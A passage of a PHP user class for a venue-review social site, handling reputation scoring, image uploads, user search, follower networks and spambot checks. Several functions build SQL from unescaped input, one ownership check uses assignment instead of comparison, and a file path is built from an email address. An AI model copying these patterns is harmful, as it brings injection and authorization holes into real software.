								  'value' => $row['num']));
		$sd->add();
		$res = tep_db_query("select id from users where last_login > '" . date("Y-m-d H:i:s", strtotime("- 1 week")) . "'" );
		$rows = array();
		while ($row = tep_db_fetch_array($res)) {
			$rows[] = $row;
		}
		tep_db_free_result($res);
		foreach ($rows as $row) {
			$user = user::load($row['id']);
			if ($user->real_coc > 0) {
				$user->available_fails =  floor($user->real_coc / 50);
				$user->save();
			}
		}
	}
	
	function update_coc() {
		$total_contribution = 0;

		/*
		  venues entered: 	20
		  reviews       :		5
		  props					:		2
		  qa						:		4
		  firsts				:   15
		  links out			:		2
		  + 10% of average 2nd hand coc
		*/
		$props = $this->props();
		echo "=====\nPROPS: ". print_r($props,true) . "\n";
		$num_goodprops = 0;
		$num_badprops = 0;
		if ( $props ) {
			$num_badprops = $props[6] + $props[7];
			unset($props[6]);
			unset($props[7]);
			$num_goodprops = array_sum($props);
		}
		echo "gp: $num_goodprops\tbp: $num_badprops\n";
		$num_props = $num_goodprops - $num_badprops;
		echo "num_props: $num_props\n";
		$num_venues_entered = $this->num_venues_entered();
		echo "venues entered: $num_venues_entered\n";
		$num_reviews = $this->num_reviews();
		echo "num reviews: $num_reviews\n";
		$num_firsts = sizeof($this->first_reviews());
		echo "num firsts: $num_firsts\n";
		list($followers,$numfollowers) = $this->followers();
		$second_hand_coc = 0;
		if ( $followers ) {
			foreach ($followers as $f) {
				$cocs[] = $f->follower_user()->coc;
			}
			sort($cocs);
			array_pop($cocs);
			if ( sizeof($cocs) > 0 ) {
				$second_hand_coc = array_sum($cocs) / sizeof($cocs) / 20;
			}

		}

		$num_qa = $this->num_qa();
		echo "num_qa: $num_qa\n";

		$coc = ($num_props * 2) + ($num_reviews * 5) + ($num_venues_entered * 20) + ($num_qa * 4)
			+ ($numfollowers * 2) + ($num_firsts * 10) + ($second_hand_coc / 10);
		$date_diff = abs(time()-strtotime($this->created)) / 86400;
		echo "date_diff: $date_diff\n";
		if ( $date_diff > 7 ) {
			$coc = $coc * 2;
		}
		$real_coc = $coc;
		echo "coc: $coc\n\n";
		if ($coc > MAX_COC) {
			$coc = MAX_COC;
		}
		$update_sql = "update users set coc = '$coc', real_coc = '$real_coc' where id = '{$this->id}'";
		$upd_res = tep_db_query($update_sql);
		return true;
	}

	public function num_qa() {
		$q_sql = "select ifnull((select count(q.id) from questions q inner join entities en on q.entity_id = en.id where en.created_by = '{$this->id}'),0) + (3 * ifnull((select count(id) from answers where user_id = '{$this->id}'),0)) as total";
		//echo "q_sql: $q_sql<br/>";
		$q_res = tep_db_query($q_sql);
		$q_row = tep_db_fetch_array($q_res);
		$num_qa = intval($q_row['total']);
		return $num_qa;
	}
	public function addpic($pic_array = array(), $caption = '', $priority = '', $isavatar = false ) {

		if ( !$this->id ) {
			error_log( "[user::addpic] no id", 3, ERROR_LOG);
			return false;
		}
		$pic = new userimage(array('user_id' => $this->id,
								   'caption' => $caption,
								   'priority' => $priority,
								   'isavatar' => $isavatar ? '1' : '0' ));

		if ($pic->add($pic_array)) {

			$this->images = ''; // reset images
			$this->images();
			return true;
		} else {
			return false;
		}
	}

	public function props() {
		if ( !$this->props ) {
			$this->props = prop::num_props_for_user_id($this->id);
		}
		return $this->props;
	}
	public function delpic($pid) {
		$im = new userimage(array('id' => $pid));
		$im->retrieve();
		if ($im->user_id = $this->id) {
			if ($im->delete()) {
				$this->images = ''; // reset images
				return true;
			} else {
				global $tnh;
				error_log("no delete for user image: " . print_r($tnh->error, true), 3, ERROR_LOG);
			}
		} else {
			return false;
		}
	}

	public static function simple_search($term, $fields = array(),$results_wanted = 'all', $offset = 0) {
		if ( ! $term ) {
			return array(array(),0);
		}
		$sql = "select SQL_CALC_FOUND_ROWS u.id from users u 
						where (";
		foreach ( $fields as $f ) {
			$sql .= $f . " like '%{$term}%' or ";
		}
		$sql = rtrim($sql,'or ');
		$sql .= ") and u.active = 1 and u.validated = 1";
		if ($results_wanted != 'all') {
			$sql .= " limit $offset, $results_wanted";
		}
		$res = tep_db_query($sql);
		$rows = $results = array();
		while ($row = tep_db_fetch_array($res)) {
			$rows[] = $row;
		}
		tep_db_free_result($res);
		$res2 = tep_db_query("select found_rows()");
		$row2 = tep_db_fetch_array($res2);
		$numrows = $row2['found_rows()'];
		tep_db_free_result($res2);
		foreach ($rows as $row) {
			if ($u = user::load($row['id'])) {
				$results[] = $u;
			}

		}

		return array($results, $numrows);
	}


	public static function contact_search($array) {
		$sql = "select u.id from users u  where ";
		$pairs =  array();
		if (isset($array['username']) && $array['username'] != '') {
			$pairs[] = 'u.username = "' . $array['username'] . '"';
		}
		if (isset($array['name']) && $array['name'] != '') {
			$pairs[] = 'name = "' . $array['name'] . '"';
		}

		$sql .= join(' AND ', $pairs);

		$sql .= " and u.active = 1";
		$objects = array();
		$rows = array();
		if ( $res = tep_db_query($sql) ) {
			while ( $v = tep_db_fetch_array($res) ) {
				$rows[] = $v;
				
			}
			tep_db_free_result($res);
			foreach ($rows as $v) {
				$user = user::load($v['id']);
				$objects[] = $user;
			}
		}

		return $objects;

	}

	public static function count() {
		$res = tep_db_query("select count(id) as num from users");
		$row = tep_db_fetch_array($res);
		return intval($row['num']);
	}

	/* useful for network search */
	public function recommended_entity_ids() {
		$sql = "select distinct(entity_id) from reviews where user_id = '{$this->id}' and rating_index > 2.5
union select entity_id from userfavorites where user_id = '{$this->id}'";
		$res = tep_db_query($sql);
		$results = $seenids = array();
		while ($row = tep_db_fetch_array($res)) {
			if (!in_array($row['entity_id'],$seenids)) {
				$results[] = $row['entity_id'];
				$seenids[] = $row['entity_id'];
			}
		}
		return $results;
	}

	public function all_friends ($visited_ids = array()) {
		if ( in_array($this->id, $visited_ids)) {
			return false;
		}
		$results = $subresults = array();
		$visited_ids[] = $this->id;
		list($followed, $num) = $this->followed();
		foreach ($followed as $neigh) {
			if ($ret = $neigh->follower_user()->all_friends($visited_ids)) {
				$results[$this->id] = $ret;
			} else {
				$results[] = $ret;
			}
		}

		return $results;
	}

	function retrieveTree($visited_ids = array())  {
		if ( in_array($this->id, $visited_ids)) {
			return false;
		}
		list($dir,$num)= $this->followed();
		$visited_ids[] = $this->id;
		if ($num > 0) {
			error_log("friends: " . print_r($dir,true), 3, ERROR_LOG);
			foreach ($dir as $element) {
				if ( $element->followed_user()->followed() ) {
					$array[] = $element;
					$array[] = $element->retrieveTree($visited_ids);
				} else {
					$array[] = $element;

				}

				error_log("visited_ids: " . print_r($visited_ids, true), 3, ERROR_LOG);
			}

		}
		return (isset($array) ? $array : false);
	}



	public function network($seen_ids = array(), $levels = 4) {
		//		error_log("seen ids: " . print_r($seen_ids, true) , 3, ERROR_LOG);
		if ($levels < 1) {
			return false;
		}
		// error_log("Level is $levels", 3, ERROR_LOG);
		$results = array();
		if (!$seen_ids) {
			$seen_ids = array($this->id);
		}
		if (list($followed, $num) = $this->followed()) {
			foreach ($followed as $friend) {

				if ( !in_array($friend->followed_user()->id, $seen_ids)) {
					//	  error_log('id ' . $friend->id . ' is not in ' . print_r($seen_ids,true) . "\n", 3, ERROR_LOG);
					$seen_ids[] = $friend->followed_user()->id;
					//	  error_log("adding id " . $friend->id . " to seen list\n", 3, ERROR_LOG);
					// error_log("list is: " . print_r($seen_ids,true) . "\n", 3, ERROR_LOG);
					$network = $friend->followed_user()->network($seen_ids, $levels -1);
					$results[$friend->followed_user()->id] = $network;
					//$results[$friend->id] = $network;
				} else {
					// error_log("seen id before: " . $friend->id . "\n", 3, ERROR_LOG);
				}
			}
		}
		return $results;
	}

	public function icon($size = 'small', $name = false, $target = '', $style = '') {
		if (!$target) {
			$target = '/' . $GLOBALS['lang_short'] . '/user/profile/' . $this->id;
		}
		if ($size == 'small') {
			$return = '<div class="tinySquareImageFrame' .  ($this->elite ? ' elite' : '') . '"';
			if ($name) {
				$return .= ' style="height: 55px; overflow: hidden; font-size: 7px;' . $style . '"';
			} else {
				$return .= ' style="' . $style . '"';
			}
			$return .= '><a href="' . $target . '" title="' .  $this->username . ($this->elite ? ' ' . _('(elite user)') : '') . '"><img class="avatar-img" src="' .  DIR_WS_USERIMG_TINY_SQUARE . $this->avatar_image()->filename() . '" alt="' .  stripslashes($this->avatar_image()->caption) . '" width="40" height="40" /></a>';
			if ($name) {
				$return .='<br/><a href="' . $target . '" title="' .  $this->username . '">' .  $this->username . '</a>';
			}
			$return .= '</div>';
		} else {
			$return = '<div class="medSquareImageFrame' . ($this->elite ? ' elite' : '') . '"';
			if (!$name) {
				$return .= ' style="height: 100px;' . $style . '"';
			} else {
				$return .= ' style="' . $style . '"';
			}
			$return .= '><a href="' . $target . '" title="' .  $this->username . ($this->elite ? ' ' . _('(elite user)') : '') . '"><img class="avatar-img" src="' .  DIR_WS_USERIMG_SMALL_SQUARE . $this->avatar_image()->filename() . '" alt="' .  stripslashes($this->avatar_image()->caption) . '" width="100" height="100" /></a>';
			if ($name) {
				$return .= '<br/><a href="' . $target . '" title="' .  $this->username . '">' .  $this->username . '</a></a>';
			}
			$return .= '</div>';
		}
		return $return;
	}

	public function avatar() {


	  if ( $this->avatar_image()->sizeratio > 1 ) {
		  $w =  IMG_MEDSMALL_X;
	  } else {
		  $w = IMG_MEDSMALL_X *  $this->avatar_image()->sizeratio;
	  }
	  if ( $this->avatar_image()->sizeratio > 1 ) {
		  $h = IMG_MEDSMALL_X /  $this->avatar_image()->sizeratio;
	  } else {
		  $h = IMG_MEDSMALL_X ;
	  }
	  $h = round($h,0);
	  $w = round($w,0);
	  $html = '<img class="avatag-img" src="' . DIR_WS_USERIMG_SMALL . $this->avatar_image()->filename() . '" width="' . $w . '" height="' .  $h . '" alt="' .  $this->avatar_image()->caption . '" />';
	  return $html;

  }
	public function internalLink($linktext = null) {
		if ($linktext) {
			$lt = $linktext;
		} else {
			$lt = $this->username;
		}


		return '<a href="' . $this->internalURL() . '">' . $lt . '</a>';
	}
	
	public function internalURL() {
		return '/' . $GLOBALS['lang_short'] . '/user/profile/' . $this->id;
	}
	
	public function adminLink($linktext = null) {
		if ($linktext) {
			$lt = $linktext;
		} else {
			$lt = $this->username;
		}


		return '<a href="/' . $GLOBALS['lang_short'] . '/admin/user/show/' . $this->id . '">' . $lt . '</a>';
	}


	public function listings($results_wanted = 'all',$offset = 0) {
		return listing::get_user_listings($this->id, $results_wanted,$offset);
	}
	
	public function propertylistings($results_wanted = 'all', $offset = 0) {
		return propertylisting::propertylistings_for_user_id($this->id);
	}
	
	public function jobs () {
		return job::jobs_for_user_id($this->id);
	}

	public function change_password($password,$confirm_password) {
		$validationError = array();
		// check password
		if ( isset($password) && $password != '' ) {
			if ( !isset($confirm_password) || $confirm_password == '' ) {
				$validationError[] = sprintf(PLEASE_ENTER,_('password 2'));
			} else {
				if ( ( $password === $confirm_password ) && tnh::is_legal_characters($password) ) {
					if ( ( strlen($password) < 4 ) || ( strlen($password) > 20 )) {
						$validationError[] = sprintf(LENGTH,_('password'), 4, 20);
					} else {
						if ($this->setPassword($password)) {
							return true;
						}
					}
				} else {
					$validationError[] = _('passwords do not match');
				}
			}
		} else if ( isset($confirm_password) && $confirm_password != '' ) {
			$validationError[] = _('please enter the same password twice');
		}
		if ($validationError) {
			return $validationError;
		} else {
			return true;
		}


	}

	public function available_listitems() {
		$reviews = $this->reviews();
		$results = array();
		$seenIds = array();
		foreach ($reviews as $review) {
			if (!in_array($review->entity_id, $seenIds)) {
				$results[] = $review;
				$seenIds[] = $review->entity_id;
			}

		}

		return $results;
	}
	
	public static function premium_users($type_id, $city_id = null) {
		if (!$city_id) {
			$city_id = $GLOBALS['city_id'];
		}
		$sql = "select u.id from users u inner join venues_owners vo on u.id = vo.user_id where vo.startdate < now() and vo.enddate > now()
		and venue_owner_status_id = $type_id";
		$res = tep_db_query($sql);
		$results = array();
		while ($row = tep_db_fetch_array($row)) {
			$results[] = user::load($row['id']);
		}
		return $results;
	}

	public static function housing_users() {
		return self::premium_users(21);
	}
	
	public function validate() {
		$validationError = array();
		
		
		
		if ( $this->username == '' ) {
			$validationError[] = sprintf(PLEASE_ENTER,_('a user name'));
		} else if ( tnh::is_legal_characters($this->username) ) {
			if ( ( strlen($this->username) < 4 ) || ( strlen($this->username) > 20 )) {
				$validationError[] = sprintf(LENGTH,_('user name'),4,20);
			}
			if ( !preg_match("/^[a-zA-Z0-9_-]*$/", strip_tags($this->username)) ) {
				$validationError[] = _('Your username may only contain alphanumeric characters');
			}
		} else {
			$validationError[] = sprintf(ILLEGAL_CHARS,_('user name'));
		}
		if (!$this->agreed_tos) {
			$validationError[] = _('In order to use this site you must agree to the terms of service');
		}

		// check name
		if ( isset($this->name) ) {
			if ( tnh::is_legal_characters($this->name) ) {
				// nothing, good
				$this->name = strip_tags($this->name);
			} else {
				$validationError[] = sprintf(ILLEGAL_CHARS,_('name'));
			}
		}
		if ( isset($this->employer) ) {
			if ( tnh::is_legal_characters($this->employer) ) {
				// nothing, good
				$this->employer = strip_tags($this->employer);
			} else {
				$validationError[] = sprintf(ILLEGAL_CHARS,_('employer'));
			}
		}
		// check url
		if (  $this->url ) {
			if ( tnh::is_legal_characters($this->url) ) {
				if ( substr(strip_tags($this->url), 0, 7) != 'http://' ) {
					$this->url = 'http://' . strip_tags($this->url);
				} else {
					$this->url = strip_tags($this->url);
				}
			} else {
				$validationError[] = sprintf(ILLEGAL_CHARS,_('URL'));
			}
		}
		// check dates
		// check here from
		if ( isset($this->herefrom) && $this->herefrom != '' ) {
			if ( !tnh::isvaliddate($this->herefrom) ) {
				$validationError[] = _('Invalid Date: ') . _('Here To');
			}
		}
		// check here to
		if ( isset($this->hereto) && $this->hereto != '' ) {
			if ( !tnh::isvaliddate($this->hereto) ) {
				$validationError[] = _('Invalid Date: ') . _('Here To');
			}
		}
		// check numeric fields
		// check agegroup_id
		if ( isset($this->agegroup_id) && $this->agegroup_id != '' && !is_numeric($this->agegroup_id)) {
			$validationError[] = sprintf(NUMERIC,'agegroup id');
		}
		if ( isset($this->occupation_id) && $this->occupation_id != '' && !is_numeric($this->occupation_id)) {
			$validationError[] = sprintf(NUMERIC,'occupation id');
		}
		if ( isset($this->profession_id) && $this->profession_id != '' && !is_numeric($this->profession_id)) {
			$validationError[] = sprintf(NUMERIC,'profession id');
		}

		// check text field
		if (isset($this->testament) && $this->testament != '') {
			if (tnh::is_legal_characters($this->testament)) {
				$this->testament = tnh::hs($this->testament);
			} else {

				$validationError[] = sprintf(ILLEGAL_CHARS,_('testament'));
			}
		}

		if ($validationError) {
			return $validationError;
		} else {
			return true;
		}
	}
	
	function checkSpambot($ip,$mail){
	    $spambot = false;
	    //put the main domains in the array
	    $main_domains = array('mail.ru','bigmir.net', 'privacymailshh.com');
		 //e-mail not found in the database, now check the ip
		 try {
	        $xml_string = file_get_contents('http://www.stopforumspam.com/api?ip='.$ip);
	        $xml = new SimpleXMLElement($xml_string);
	       
		    
		    if($xml->appears == 'yes'){
		        $spambot = true;
		    } elseif ($spambot != true){
		       //check the e-mail adress
		    	$xml_string = file_get_contents('http://www.stopforumspam.com/api?email='.urlencode($mail));
		    	$xml = new SimpleXMLElement($xml_string);
		     	if($xml->appears == 'yes'){
	          	  $spambot = true;
	        	}
		    }
		 } catch (Exception $e) {
		 	error_log("exception from stopforumspam try: " . $e->getMessage(), 3, ERROR_LOG);
		 }
	    //check the main domains if there is still no spammer found, you can add more if you want in the $main_domains array
	    if($spambot != true){
	        for($i = 0; $i < count($main_domains); $i++){
	            if(preg_match("/" . $main_domains[$i] . "/",$mail) == 1){
	                $spambot = true;
	            }
	        }
	    }
	    // create an .txt file with the info of the spambot, if this one already exists, increase its amount of try's
	    if($spambot == true){
	    	$filename = DIR_FS_RIZOOT . 'spambots/'.$mail.'.txt';
	        if(file_exists($filename)){
	            $spambot_old_info = file_get_contents($filename);
	            $spambot_old_info = explode(',',$spambot_old_info);
	            $spambot_old_info[1] = $spambot_old_info[1]+1;
	            $spambot_old_info = implode(',',$spambot_old_info);
	            file_put_contents($filename,$spambot_old_info);
	        }else{
	            $spambot_info = $ip.',1';
	            file_put_contents($filename,$spambot_info);
	        }
	    }
	    return $spambot;
	}

 }
?>
